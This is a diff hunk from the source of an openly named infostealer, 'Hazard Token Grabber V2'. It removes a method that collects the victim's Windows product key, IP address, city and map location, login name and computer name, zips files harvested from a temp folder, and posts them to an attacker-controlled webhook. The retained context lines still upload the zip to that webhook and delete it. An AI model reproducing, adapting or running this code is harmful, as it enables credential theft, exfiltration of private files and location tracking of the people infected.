@@ -360,55 +360,6 @@ class Hazard_Token_Grabber_V2:
         image.save(self.tempfolder + "\\Screenshot.png")
         image.close()
 
-    def SendInfo(self):
-        wname = self.getProductKey()[0]
-        wkey = self.getProductKey()[1]
-        ip = country = city = region = googlemap = "None"
-        try:
-            data = requests.get("https://ipinfo.io/json").json()
-            ip = data['ip']
-            city = data['city']
-            country = data['country']
-            region = data['region']
-            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
-        except Exception:
-            pass
-        _zipfile = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')
-        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
-        abs_src = os.path.abspath(self.tempfolder)
-        for dirname, _, files in os.walk(self.tempfolder):
-            for filename in files:
-                absname = os.path.abspath(os.path.join(dirname, filename))
-                arcname = absname[len(abs_src) + 1:]
-                zipped_file.write(absname, arcname)
-        zipped_file.close()
-        files = os.listdir(self.tempfolder)
-        for f in files:
-            self.files += f"\n{f}"
-        self.fileCount = f"{len(files)} Files Found: "
-        embed = {
-            "avatar_url":"https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif",
-            "embeds": [
-                {
-                    "author": {
-                        "name": "Hazard Token Grabber.V2",
-                        "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
-                        "icon_url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif"
-                    },
-                    "description": f'**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
-                    "color": 16119101,
-
-                    "thumbnail": {
-                      "url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Hazard.gif"
-                    },       
-
-                    "footer": {
-                      "text": "Rdimo#6969 https://github.com/Rdimo/Hazard-Token-Grabber-V2"
-                    }
-                }
-            ]
-        }
-        requests.post(self.webhook, json=embed)
         requests.post(self.webhook, files={'upload_file': open(_zipfile,'rb')})
         os.remove(_zipfile)
 
